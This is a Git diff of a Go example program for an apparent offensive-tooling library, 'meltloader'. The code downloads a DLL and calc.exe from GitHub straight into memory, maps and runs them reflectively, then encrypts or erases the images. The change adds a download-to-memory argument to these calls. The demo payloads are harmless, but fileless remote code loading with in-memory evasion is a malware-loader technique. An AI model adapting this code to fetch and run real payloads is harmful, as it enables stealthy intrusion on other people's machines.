@@ -5,6 +5,7 @@ import (
 	"log"
 	"runtime/debug"
 
+	"github.com/carved4/meltloader/pkg/net"
 	"github.com/carved4/meltloader/pkg/pe"
 )
 
@@ -15,7 +16,7 @@ func main() {
 	// you can also call the func without the sleep parameter as displayed below
 	// the mapped DLL in memory after load and execution is encrypted in place with RC4 and will not be able to be interacted with
 	// if you wish to change this in your own projects, just remove the defer enc.EncryptBuffer of our mapped image
-	mapping2, err := pe.LoadDLLFromURL("https://github.com/carterjones/hello-world-dll/releases/download/v1.0.0/hello-world-x64.dll", "export_only:MessageBoxThread")
+	mapping1, err := pe.LoadDLLFromURL("https://github.com/carterjones/hello-world-dll/releases/download/v1.0.0/hello-world-x64.dll", "MessageBoxThread", net.DownloadToMemory)
 	if err != nil {
 		fmt.Println("failed to download", err)
 	}
@@ -26,7 +27,7 @@ func main() {
 		fmt.Printf("DLL %d: Base=0x%X, Size=%d bytes\n", i, baseAddrs[i], sizes[i])
 	}
 	// call on other mapping (this takes in an interface returned into mapping and optionally unpacked for display in pe.GetMap())
-	err = pe.Melt(mapping2)
+	err = pe.Melt(mapping1)
 	if err != nil {
 		fmt.Println("failed to melt dll after load:", err)
 	}
@@ -39,7 +40,7 @@ func main() {
 		fmt.Printf("DLL %d: Base=0x%X, Size=%d bytes\n", i, baseAddrs[i], sizes[i])
 	}
 	// demonstrate another pe load, should spawn two calcs by now then return to loader and print how many are mapped, then melt
-	peMapping2, err := pe.LoadPEFromUrl("https://github.com/carved4/go-maldev/raw/refs/heads/main/generator/calc.exe", 2)
+	mapping2, err := pe.LoadPEFromUrl("https://github.com/carved4/go-maldev/raw/refs/heads/main/generator/calc.exe", 2, net.DownloadToMemory)
 	if err != nil {
 		fmt.Println("failed to load PE:", err)
 	} else {
@@ -51,7 +52,7 @@ func main() {
 	for i := 0; i < peCount; i++ {
 		fmt.Printf("PE %d: Base=0x%X, Size=%d bytes\n", i, peBaseAddrs[i], peSizes[i])
 	}
-	err = pe.MeltPE(peMapping2)
+	err = pe.MeltPE(mapping2)
 	if err != nil {
 		fmt.Println("failed to melt PE after load:", err)
 	}
@@ -62,7 +63,7 @@ func main() {
 	for i := 0; i < peCount; i++ {
 		fmt.Printf("PE %d: Base=0x%X, Size=%d bytes\n", i, peBaseAddrs[i], peSizes[i])
 	}
-	peMapping3, err := pe.LoadPEFromUrl("https://github.com/carved4/go-maldev/raw/refs/heads/main/generator/calc.exe", 2)
+	mapping3, err := pe.LoadPEFromUrl("https://github.com/carved4/go-maldev/raw/refs/heads/main/generator/calc.exe", 2, net.DownloadToMemory)
 	if err != nil {
 		fmt.Println("failed to load PE:", err)
 	} else {
@@ -73,7 +74,7 @@ func main() {
 	for i := 0; i < peCount; i++ {
 		fmt.Printf("PE %d: Base=0x%X, Size=%d bytes\n", i, peBaseAddrs[i], peSizes[i])
 	}
-	err = pe.MeltPE(peMapping3)
+	err = pe.MeltPE(mapping3)
 	if err != nil {
 		fmt.Println("failed to melt PE after load:", err)
 	}
@@ -82,5 +83,4 @@ func main() {
 	for i := 0; i < peCount; i++ {
 		fmt.Printf("PE %d: Base=0x%X, Size=%d bytes\n", i, peBaseAddrs[i], peSizes[i])
 	}
-
 }
